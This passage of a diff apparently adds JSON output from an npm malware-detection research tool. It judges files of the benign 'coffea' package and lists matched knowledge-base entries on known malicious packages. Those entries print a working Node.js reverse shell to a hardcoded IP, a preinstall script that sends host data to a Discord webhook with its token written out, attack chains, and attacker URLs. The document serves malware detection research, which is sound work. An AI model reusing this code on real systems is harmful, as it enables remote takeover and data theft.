+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_786473_snippet_2",
+              "source_package": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_786473/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45059990882873535,
+              "code_similarity": 0.48986056447029114,
+              "behavior_similarity": 0.41133925318717957,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "(function(){\n  var net = require('net'),\n      cp = require('child_process'),\n      sh = cp.spawn('/bin/sh', []),\n      client = new net.Socket();\n  client.connect(5482, '5.189.184.129', function(){\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n  });\n})();",
+                "code_behavior": "At import-time, the code spawns a new shell process and establishes a TCP connection to a hardcoded remote IP address, piping shell input and output through the network socket to create a reverse shell, enabling remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a reverse shell to an external IP is a classic post-exploitation technique used by attackers to gain remote access and control over compromised systems.",
+                  "violated_expectations": "Normal npm packages should not spawn shell processes or initiate outbound network connections to arbitrary IP addresses, especially at import-time.",
+                  "similar_legitimate_use": "Penetration testing frameworks may use reverse shells, but such behavior is never appropriate in production dependencies or general-purpose packages.",
+                  "key_indicators": [
+                    "Spawning of /bin/sh via child_process.spawn",
+                    "Outbound TCP connection to hardcoded IP (5.189.184.129:5482)",
+                    "Piping shell stdin/stdout/stderr to a network socket",
+                    "Immediate execution at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "run.js (main entry point of malicious package)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "amzn, zg-rentals, lyft-dataset-sdk, serverless-slack-app",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions published as malicious)",
+                  "why_malicious": "These packages were intentionally crafted to exploit dependency confusion attacks, enabling attackers to execute code at import-time that exfiltrates sensitive files (such as /etc/shadow and .bash_history) and establishes reverse shells. This results in credential theft and allows remote system compromise by providing attackers with unauthorized access and control."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a result of dependency confusion, replacing an internal dependency with a malicious public version.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is present and will execute at import-time."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes automatically upon import, harvesting sensitive files such as /etc/shadow and .bash_history.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Sensitive credential and history data is collected for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected sensitive data is exfiltrated to attacker-controlled servers via outbound HTTPS or HTTP requests.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and system information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "A reverse shell is established, granting the attacker remote access to the compromised system.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains persistent remote control and can execute arbitrary commands."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Node.js package accessing sensitive files such as /etc/shadow or .bash_history at import-time",
+                    "Spawning of shell processes (e.g., /bin/sh) and connecting to external IP addresses",
+                    "Immediate outbound HTTPS or HTTP requests containing local file contents or credential data",
+                    "Reverse shell activity initiated by package code during installation or import"
+                  ],
+                  "file_indicators": [
+                    "run.js or index.js containing execSync('cat /etc/shadow') or references to .bash_history",
+                    "Hardcoded external hostnames or IP addresses (e.g., comevil.fun, 5.189.184.129) in package code",
+                    "Use of child_process or net modules to spawn shells or create sockets"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to comevil.fun, d9c0c0d50237.ngrok.io, 5.189.184.129",
+                    "Unusual HTTPS or HTTP requests initiated during package installation or import, especially to unknown domains or IPs"
+                  ],
+                  "how_to_detect": "Monitor for Node.js packages that access sensitive files (such as /etc/shadow or .bash_history) or spawn shell processes at import-time. Flag any package that initiates outbound network connections to unknown domains or hardcoded IP addresses during installation or import. Use static analysis to detect suspicious use of execSync, child_process.spawn, net.Socket, or references to credential files. Correlate package installation or import events with subsequent network activity to known malicious indicators for automated detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/parser/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/event.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "event_slice_1",
+          "code_snippet": "/*jslint node: true*/\n\"use strict\";\n\nfunction Event(irc, network) {\n    this.irc = irc;\n    this.network = network;\n\n    // hide `client` property\n    Object.defineProperty(this, 'irc', {\n        enumerable: false,\n        writable: true\n    });\n}\n\nmodule.exports = Event;\n\nEvent.prototype.getMessage = function getMessage() {\n    return this._message;\n};\n\nEvent.prototype.reply = function reply(message) {\n\treturn this._reply(\"send\", message);\n};\n\nEvent.prototype.replyAction = function reply(message) {\n\treturn this._reply(\"action\", message);\n};\n\nEvent.prototype.replyNotice = function reply(message) {\n\treturn this._reply(\"notice\", message);\n};\n\nEvent.prototype._reply = function _reply(action, message) {\n    if (this.channel || this.user) {\n        var fn = this.irc[action];\n        if (typeof fn === 'function') {\n            fn = fn.bind(this.irc);\n            return fn(this.channel ? this.channel : this.user, message, this.network);\n        }\n    }\n};",
+          "is_malicious": false,
+          "malice_score": 0.36969103415807086,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and invokes IRC client methods (send, action, notice) to send messages or actions to IRC channels or users. It uses the internal IRC client object to perform network communication over IRC protocol, facilitating message transmission within IRC networks.",
+          "explanation": "[LLM Judgment: Benign] The provided code defines an Event class that wraps an IRC client object to send messages, actions, and notices to IRC channels or users. This is typical behavior for IRC client libraries or bots that interact with IRC networks. Unlike the known malicious patterns, this code does not open network sockets for remote shell access, does not execute shell commands, does not collect or exfiltrate sensitive system information, nor does it connect to attacker-controlled servers for command and control or DDoS activities. The code is straightforward, lacks obfuscation, and does not perform any suspicious system or network operations beyond normal IRC message sending. Therefore, it does not exhibit malicious intent or behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3905507028102875,
+              "code_similarity": 0.3802245855331421,
+              "behavior_similarity": 0.40087682008743286,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_1",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3633996248245239,
+              "code_similarity": 0.3974262773990631,
+              "behavior_similarity": 0.32937300205230713,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// new.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'discord.com',\n  path: '/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "At preinstall, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to a hardcoded Discord webhook endpoint, resulting in exfiltration of host information to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The script is executed automatically during the npm package installation process, collects sensitive system and network information, and transmits it to an external Discord webhook without any user notification or consent. This behavior is a clear indicator of malicious intent, as it enables unauthorized data exfiltration at install-time.",
+                  "violated_expectations": "Legitimate npm packages do not collect or transmit host information during installation. Preinstall scripts are expected to perform setup or dependency checks, not to access user details or make outbound network requests to third-party endpoints.",
+                  "similar_legitimate_use": "Some legitimate tools may collect anonymized telemetry or error data, but only with explicit user consent and clear documentation. They do not exfiltrate sensitive host information silently during installation.",
+                  "key_indicators": [
+                    "Use of preinstall script to trigger code execution during installation",
+                    "Collection of username, hostname, and public IP address via os and child_process modules",
+                    "Outbound HTTPS POST request to a hardcoded Discord webhook endpoint",
+                    "No user notification, consent, or documentation of data collection",
+                    "Presence of new.js referenced in package.json preinstall field"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "package.json (preinstall field) and new.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1155988140591419412/bleuGvUtBCzaGsAkAI1MT9Yd-6YxHuUlZe91XSdfioky5-0e3gzeW4ztWskX1qYjSxzr",
+                    "Outbound HTTPS POST requests to hits.dwyl.com/api/collect"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that access system information (username, hostname, public IP) and initiate outbound network requests to external domains, especially Discord webhooks or non-standard endpoints like hits.dwyl.com. Flag packages with suspiciously named scripts (e.g., new.js) referenced in package.json preinstall fields. Use static analysis to detect the use of os, https, and child_process modules in installation or entry-point scripts, and employ network monitoring to identify exfiltration attempts to known malicious endpoints. Pay special attention to packages with names mimicking popular libraries, as these are common in typosquatting campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113159_943982_snippet_3",
+              "source_package": "Shc Downloader / XMRig CoinMiner Campaign (Linux (malware distributed as shell scripts, binaries, and Perl scripts))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113159_943982/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.35777026414871216,
+              "code_similarity": 0.20995737612247467,
+              "behavior_similarity": 0.5055831670761108,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "perl botcarternew",
+                "code_behavior": "At runtime, the Perl script initiates an outbound connection to an attacker-controlled IRC server, joins a specific channel, and listens for remote DDoS commands, enabling the compromised host to participate in coordinated DDoS attacks as part of a botnet.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated IRC connections and command execution for DDoS attacks are classic behaviors of botnet malware, especially when initiated by hidden or unauthorized scripts.",
+                  "violated_expectations": "Legitimate Perl scripts do not establish persistent IRC connections or await remote attack commands without user intent or business justification.",
+                  "similar_legitimate_use": "IRC bots may be used for legitimate chat automation or monitoring, but not for DDoS or remote attack orchestration.",
+                  "key_indicators": [
+                    "Outbound IRC connections from server processes or Perl scripts",
+                    "Perl scripts containing DDoS routines or command-and-control logic",
+                    "Persistence mechanisms to relaunch bot scripts after reboot",
+                    "Unusual network activity to IRC ports (e.g., 6667) from non-user processes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after downloader script execution)",
+                  "file_location": "Perl script (e.g., botcarternew, .ubuntu) located in /tmp or home directory",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Shc Downloader / XMRig CoinMiner Campaign",
+                  "package_manager": "Linux (malware distributed as shell scripts, binaries, and Perl scripts)",
+                  "package_versions": "N/A (malware campaign, not a versioned package)",
+                  "why_malicious": "This campaign is malicious because it orchestrates a multi-stage attack involving brute-force SSH access, deployment of downloader scripts, installation and execution of the XMRig cryptocurrency miner, and activation of a Perl-based IRC DDoS bot. The malware abuses system resources for illicit mining, establishes persistent remote control via IRC, and enables attackers to launch DDoS attacks, all without user consent or awareness."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Brute-force SSH credentials to gain unauthorized access to Linux servers.",
+                    "implemented_by": [],
+                    "leads_to": "Initial access for malware deployment"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Deploy and execute downloader shell script to fetch additional payloads from remote servers.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Download and execution of miner and bot binaries"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extract and execute XMRig miner to hijack system resources for cryptocurrency mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing illicit mining and resource abuse"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Deploy and execute Perl DDoS IRC bot to connect to attacker-controlled IRC channels for remote command and control.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Botnet participation and DDoS attack capability"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated download and execution of binaries from remote, non-standard URLs or hardcoded IP addresses",
+                    "Presence and execution of XMRig miner or similar binaries in /tmp or hidden directories",
+                    "Creation or use of mining configuration files (e.g., config.json) in /tmp or non-standard locations",
+                    "Outbound IRC connections from non-user or Perl script processes",
+                    "High, sustained CPU usage by unknown or suspicious processes",
+                    "Persistence mechanisms for malicious scripts or binaries"
+                  ],
+                  "file_indicators": [
+                    "/tmp/xmrig",
+                    "/tmp/.system3d",
+                    "/tmp/config.json",
+                    "/tmp/snunewa.tar",
+                    "Perl scripts named botcarternew, .ubuntu",
+                    "Launcher scripts named run, .b4nd1d0",
+                    "/tmp/kermine"
+                  ],
+                  "network_indicators": [
+                    "Connections to 64.227.112.247:80",
+                    "Connections to 157.230.116.194:80",
+                    "Downloads from hxxp://172.105.211.21/",
+                    "Downloads from hxxp://167.172.103.111/",
+                    "Downloads from hxxp://172.104.170.240/",
+                    "Downloads from hxxp://wget.hostname.help/",
+                    "Downloads from hxxp://pateu.freevar.com/",
+                    "Outbound IRC traffic to attacker-controlled servers (e.g., on port 6667)"
+                  ],
+                  "how_to_detect": "Monitor for unauthorized SSH logins followed by the download and execution of binaries from suspicious external URLs or hardcoded IP addresses. Detect the presence of XMRig or similar mining binaries and configuration files in temporary or hidden directories. Alert on outbound IRC connections from server or Perl script processes, especially to non-standard destinations or ports. Correlate high, sustained CPU usage with the presence of these indicators to identify illicit mining activity. Look for persistence mechanisms that relaunch malicious scripts or binaries after reboot."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456673_snippet_4",
+              "source_package": "fallguys (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3572235703468323,
+              "code_similarity": 0.38531020283699036,
+              "behavior_similarity": 0.3291369676589966,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "function send(_0x15ad43, _0x132d8, _0x2a34b7, _0x3016c, _0x5469e9, _0x2ad2fd, _0x3d6f61, _0x41c447) {\n  // ...\n  embeds: [{\n    color: 0x1132d8,\n    author: { name: _0x2a34b7, icon_url: _0x41c447 },\n    description: 'EMAIL: ' + EMAIL + '\\nUSERNAME: ' + USERNAME + ...\n  }],\n  headers: { 'Content-Type': 'application/json' }\n  // ...\n}",
+                "code_behavior": "At import-time, the code constructs a JSON payload containing harvested user profile metadata such as email and username, formats it for Discord webhook delivery, and prepares it for exfiltration to the attacker's endpoint.",
+                "malice_analysis": {
+                  "why_suspicious": "Harvesting and exfiltrating user profile metadata, especially in an obfuscated and automated manner, is a classic reconnaissance and credential theft tactic.",
+                  "violated_expectations": "Normal packages do not collect or transmit user profile data without explicit user action and clear disclosure.",
+                  "similar_legitimate_use": "User support or diagnostic tools may collect profile data, but only with user consent and for legitimate support purposes.",
+                  "key_indicators": [
+                    "Automated harvesting of user profile metadata (email, username, etc.)",
+                    "Obfuscated payload construction for webhook delivery",
+                    "Preparation of data for exfiltration at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "fallguys",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.6",
+                  "why_malicious": "The package 'fallguys' impersonates a legitimate API for the Fall Guys game but contains heavily obfuscated JavaScript code that, upon import, systematically locates, reads, and exfiltrates sensitive browser and Discord application data to a hardcoded Discord webhook. The package provides no legitimate functionality and is solely designed for credential and session theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated file paths and sensitive strings are loaded into memory at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Automated enumeration of sensitive files"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive browser and Discord storage files are read from disk using filesystem APIs.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data harvesting and preparation for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested data and user profile metadata are formatted into a JSON payload for webhook delivery.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Payload is sent to the attacker's Discord webhook endpoint via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Completion of data theft and attacker access to stolen credentials"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated arrays containing hardcoded browser and Discord storage file paths in JavaScript code",
+                    "Automated reading of browser and Discord local storage files at import-time without user interaction",
+                    "Network requests to Discord webhook endpoints with harvested sensitive data at import-time"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated arrays of file paths referencing leveldb directories",
+                    "Access to /AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb and similar paths by non-browser processes",
+                    "References to Discord and multiple Chromium-based browser storage locations in package code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to discordapp.com/api/webhooks/746189410042904617/RQVJEOhzAblK5FlkQ-WIXkWfKfg5BFCdsjTeVueAIrVLaQMTvHgbuhuqFafPZYHfwnEq",
+                    "Outbound connections to Discord webhook endpoints from npm package processes"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that, at import-time, access browser or Discord local storage files and send their contents to external webhooks, especially Discord API endpoints. Flag any code that contains obfuscated arrays of sensitive file paths or constructs network requests to hardcoded webhook URLs. Alert on npm packages that read browser or IM storage files without user interaction and initiate outbound network connections to Discord webhook domains. Correlate filesystem access to leveldb directories with network activity to Discord webhooks for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_371059_snippet_2",
+              "source_package": "LofyLife (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_113914_371059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3512555658817291,
+              "code_similarity": 0.33129191398620605,
+              "behavior_similarity": 0.3712192177772522,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript code (representative)\nconst discordPath = '/path/to/discord/app';\nfs.writeFileSync(discordPath + '/infected.js', maliciousPayload);\n// Monitor for user actions\nfs.watch(discordPath + '/Local Storage/leveldb', (event, filename) => {\n  // On credential change or payment method modification\n  sendToC2Server({ event, filename });\n});",
+                "code_behavior": "At runtime, the code writes a malicious payload to Discord client files, sets up filesystem monitoring on Discord's local storage, and exfiltrates user activity such as credential or payment method changes to a command-and-control server.",
+                "malice_analysis": {
+                  "why_suspicious": "The code modifies files within the Discord client directory and establishes persistent monitoring of sensitive user actions, which is characteristic of spyware and credential-stealing malware.",
+                  "violated_expectations": "npm packages should not alter files belonging to third-party applications like Discord, nor should they monitor or exfiltrate user credentials or payment information.",
+                  "similar_legitimate_use": "Self-updating applications may modify their own files, but third-party packages should not write to or monitor unrelated application directories, especially for credential or payment data.",
+                  "key_indicators": [
+                    "Writes malicious payloads to Discord client files",
+                    "Monitors Discord's local storage for user activity",
+                    "Exfiltrates sensitive events (credential/payment changes) to external server",
+                    "Persistence via file system monitoring"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or injected into Discord client files",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "LofyLife",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all known versions affected)",
+                  "why_malicious": "The package contains both Python and JavaScript code designed to steal Discord tokens and infect Discord client files. It monitors user actions such as logins, credential changes, and payment method modifications, exfiltrating sensitive data to an attacker-controlled server. Its primary purpose is credential theft and user surveillance, leveraging cross-language payloads and unauthorized file modifications."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial credential exfiltration via environment variable access and setup for further monitoring."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code infects Discord client files and sets up monitoring for user actions.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Continuous surveillance of user activity and exfiltration of sensitive events to the attacker's infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Embedded Python script is invoked to perform additional credential theft.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Redundant or parallel exfiltration of Discord tokens to the attacker, increasing the likelihood of successful data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to DISCORD_TOKEN environment variable by npm packages",
+                    "Network requests to unknown or hardcoded domains (e.g., malicious-domain.com) at import-time or runtime",
+                    "Modification or injection of files within Discord's application directories by third-party packages",
+                    "Invocation of embedded Python scripts from JavaScript code in npm packages",
+                    "Persistent monitoring of Discord's local storage or credential-related files"
+                  ],
+                  "file_indicators": [
+                    "Presence of embedded Python scripts (e.g., .py files) in npm packages",
+                    "Unexpected writes or modifications to Discord installation directories (e.g., /path/to/discord/app/infected.js)",
+                    "Injected or modified files within Discord's app folders, especially those not present in official distributions"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with Discord or npm (e.g., malicious-domain.com/exfiltrate)",
+                    "Connections to known malicious exfiltration endpoints as specified in the code"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for access to sensitive environment variables such as DISCORD_TOKEN, unexpected network requests to untrusted or hardcoded domains, and file modifications within Discord's application directories. Flag npm packages containing embedded Python scripts or those that attempt to execute non-JavaScript code. Use endpoint monitoring to detect unauthorized changes to Discord client files and outbound connections to known malicious infrastructure. Correlate behavioral, file, and network indicators for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/coffea/0.4.29/package/lib/parser/Message.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
